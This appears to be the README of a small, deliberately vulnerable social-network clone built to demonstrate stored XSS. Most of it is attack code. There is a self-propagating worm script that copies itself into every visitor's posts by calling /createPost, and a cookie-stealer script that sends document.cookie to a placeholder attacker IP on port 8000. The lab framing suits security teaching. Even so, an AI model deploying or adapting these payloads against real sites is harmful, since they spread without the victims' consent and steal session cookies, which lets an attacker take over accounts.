# YourSpaceWorm
Simple myspace clone vulnerable to a myspace worm

## Database:

Mongodb nosql database. Everything stored as documents (jsons)

### users document:
```json

{
    _id: ObjectId
    username: unique string
    password: string
    name: string
    timeline: [ post subdocument ]
}
```
### posts subdocument:
```json
{
    _id: ObjectId
    title: string
    content: string
}
```

## Stored XXS
The website posts are vulnerable to stored xxs. Users can put js code into both the title and content of the posts which allows them to customize their profile. 

# Worm Code 

### Title
```html
<!-- Title -->
<span class="worm-title">Mike Zylka is the coolest person out there. Go visit his site. </span>
```
<sub><sup>*\* Farhan does not approve this message*</sup></sub>
### Content
```html
<!-- Content -->
<script class="worm-script" async>
(function() {
let wormTitle = "<span class='worm-title'>" +document.getElementsByClassName('worm-title')[0].parentElement.innerText + "</span>";
console.log(wormTitle)

let wormContent = "<script class=\"worm-script\" async>" + document.getElementsByClassName('worm-script')[0].innerText + "<\/script>";
console.log(wormContent)


async function wormPost() {
const result = await fetch('/createPost', {
                            method: 'POST',
                            headers: {
                                'Content-Type': 'application/json'
                            },
                            body: JSON.stringify({
                                title: wormTitle,
                                content: wormContent
                            })
                        }).then((res) => res.json());
console.log(result);
}

wormPost()

})();
</script>
```


# Cookie Stealer Code 

## Title

```html
This will steal your cookies 
```

## Content

```html
<!-- Content -->
<script class="cookie-stealer" async>
(function() {



async function cookieStealer() {
let xhr = new XMLHttpRequest();
xhr.open('get', `http://<IP Address>:8000?cookies = ${document.cookie}`);
xhr.send();
}

cookieStealer()

})();
</script>
```
